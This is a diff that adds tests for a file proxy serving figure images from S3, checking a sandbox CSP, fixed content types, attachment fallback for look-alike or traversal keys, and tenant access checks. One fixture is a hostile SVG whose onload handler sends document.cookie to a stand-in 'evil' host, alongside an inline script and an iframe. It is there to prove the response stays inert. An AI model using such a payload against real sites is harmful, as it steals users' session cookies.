@@ -117,6 +117,71 @@ describe("file proxy", () => {
     }
   });
 
+  describe("Doppler figures", () => {
+    const figureUri = (name: string) => `s3://bucket/user-a/run-1/doppler-figures/0b6f7e8c-3c1a-4f7e-9a51-2a1d3e4f5a6b/${name}`;
+    const figureToken = (name: string, overrides: Record<string, unknown> = {}) => token({ uri: figureUri(name), name, ...overrides });
+
+    it("serves an SVG figure inline with a fixed type and a CSP that loads and runs nothing", async () => {
+      open.mockResolvedValue(object('<svg xmlns="http://www.w3.org/2000/svg"/>', { ContentType: "text/html" }));
+      const res = await get(`/v1/files/${figureToken("p3.g2.svg")}/p3.g2.svg`);
+      expect(res.status).toBe(200);
+      expect(access).toHaveBeenCalledWith(figureUri("p3.g2.svg"), "user-a", undefined);
+      expect(res.headers.get("content-type")).toBe("image/svg+xml");
+      expect(res.headers.get("content-security-policy")).toBe("default-src 'none'; style-src 'unsafe-inline'; sandbox");
+      expect(res.headers.get("x-content-type-options")).toBe("nosniff");
+      expect(res.headers.get("content-disposition")).toMatch(/^inline; filename="p3.g2.svg"/);
+      expect(res.headers.get("cache-control")).toBe("private, no-store");
+    });
+
+    it("serves an SVG figure that carries script (a compromised converter) only under the sandbox CSP", async () => {
+      // The VM's SVG allowlist is a correctness filter, not the boundary: if a decoder bug let a figure through with
+      // script, the response itself must keep it inert (no script, no network, sandboxed, never sniffed as HTML).
+      const hostile = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil/\'+document.cookie)"><script>alert(1)</script><foreignObject><iframe src="https://evil/"/></foreignObject></svg>';
+      open.mockResolvedValue(object(hostile, { ContentType: "text/html" }));
+      const res = await get(`/v1/files/${figureToken("p3.g2.svg")}/p3.g2.svg`);
+      expect(res.status).toBe(200);
+      expect(res.headers.get("content-type")).toBe("image/svg+xml");
+      const csp = res.headers.get("content-security-policy") ?? "";
+      expect(csp.split(";").map((d) => d.trim())).toEqual(expect.arrayContaining(["default-src 'none'", "sandbox"]));
+      expect(csp).not.toMatch(/script-src|allow-scripts|connect-src|frame-src|'unsafe-eval'/);
+      expect(res.headers.get("x-content-type-options")).toBe("nosniff");
+    });
+
+    it("fixes raster figure types from the key, whatever storage says", async () => {
+      for (const [name, type] of [["p3.1.webp", "image/webp"], ["p4.g1.png", "image/png"]] as const) {
+        open.mockResolvedValue(object("bytes", { ContentType: "text/html" }));
+        const res = await get(`/v1/files/${figureToken(name)}/${name}`);
+        expect(res.headers.get("content-type"), name).toBe(type);
+        expect(res.headers.get("content-security-policy"), name).toContain("sandbox");
+        expect(res.headers.get("x-content-type-options"), name).toBe("nosniff");
+      }
+    });
+
+    it("renders no other SVG: a look-alike key outside the figure layout stays an attachment", async () => {
+      for (const key of ["user-a/run-1/doppler-figures/doc/../p3.g2.svg", "user-a/run-1/uploads/p3.g2.svg", "user-a/run-1/doppler-figures/doc/evil.svg", "user-a/run-1/doppler-figures/doc/p3.g2.svg.html"]) {
+        open.mockResolvedValue(object("<svg/>", { ContentType: "image/svg+xml" }));
+        const res = await get(`/v1/files/${token({ uri: `s3://bucket/${key}`, name: "p3.g2.svg" })}/p3.g2.svg`);
+        expect(res.headers.get("content-type"), key).toBe("application/octet-stream");
+        expect(res.headers.get("content-disposition"), key).toMatch(/^attachment;/);
+      }
+    });
+
+    it("applies the same tenant checks: another tenant, a revoked document, a wrong-scope or other key all get 404", async () => {
+      const path = (overrides: Record<string, unknown> = {}) => `/v1/files/${figureToken("p3.g2.svg", overrides)}/p3.g2.svg`;
+      actor.current = { ...session, userId: "user-b", sessionId: "sess-1" };
+      expect((await get(path())).status).toBe(404);
+      actor.current = session;
+      access.mockResolvedValue(false); // another tenant's figure, or access revoked since the URL was issued
+      expect((await get(path())).status).toBe(404);
+      access.mockResolvedValue(true);
+      actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-1", orgId: "org-a", scopes: ["search"] } };
+      expect((await get(path({ bind: "k:key-1" }))).status).toBe(404);
+      actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-2", orgId: "org-a", scopes: ["artifacts"] } };
+      expect((await get(path({ bind: "k:key-1" }))).status).toBe(404);
+      expect(open).not.toHaveBeenCalled();
+    });
+  });
+
   it("maps a missing object to 404", async () => {
     open.mockRejectedValue(Object.assign(new Error("NoSuchKey"), { $metadata: { httpStatusCode: 404 } }));
     expect((await get(`/v1/files/${token()}/page-0001.png`)).status).toBe(404);
